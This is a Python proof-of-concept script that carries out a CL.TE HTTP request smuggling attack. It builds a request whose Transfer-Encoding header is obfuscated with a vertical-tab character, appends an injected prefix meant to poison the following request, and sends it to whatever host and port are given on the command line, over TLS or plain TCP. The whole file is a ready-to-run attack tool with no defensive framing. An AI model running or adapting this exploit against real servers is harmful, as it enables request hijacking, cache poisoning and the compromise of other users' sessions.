#!/usr/bin/env python3
import socket
import ssl
import sys


# CL.TE base
CLTE_TEMPLATE = """POST / HTTP/1.1
Host: {hostname}
User-Agent: malicious-payload
Content-Length: {length}
Transfer-Encoding:\x0bchunked

0

""".replace("\n", "\r\n")

# A prefix to be appended to the next request
PREFIX = """injected"""

def send_data(sock, payload):
    assert sock.send(payload) == len(payload)

def send_request(dst, payload):    
    rsock = socket.create_connection(dst)
    hostname, port = dst
    if port == 443:
        context = ssl.create_default_context()
        sslsock = context.wrap_socket(rsock, server_hostname=hostname)
        send_data(sslsock, payload)            
        return sslsock
    else:
        send_data(rsock, payload)
        return rsock

def main():
    if len(sys.argv) < 3:
        print("usage: {} hostname port".format(__file__))
        sys.exit(1)

    hostname = sys.argv[1]
    port = int(sys.argv[2])
    
    # generate exploit body
    length = 5 + len(PREFIX)
    payload = (CLTE_TEMPLATE.format(hostname=hostname, length=length) + PREFIX).encode("utf-8")
    print("[*] crafted payload: ")
    print("---")    
    print(payload.decode('utf-8'))
    print("---")    

    # send request
    print("[*] sending the payload...")
    with send_request((hostname, port), payload) as sock:
        print("[*] request was sent.")
        data = sock.recv(1024)    
        while len(data) > 0:
            print(data.decode("utf-8"))        
            data = sock.recv(1024)

if __name__ == "__main__":
    sys.exit(main())
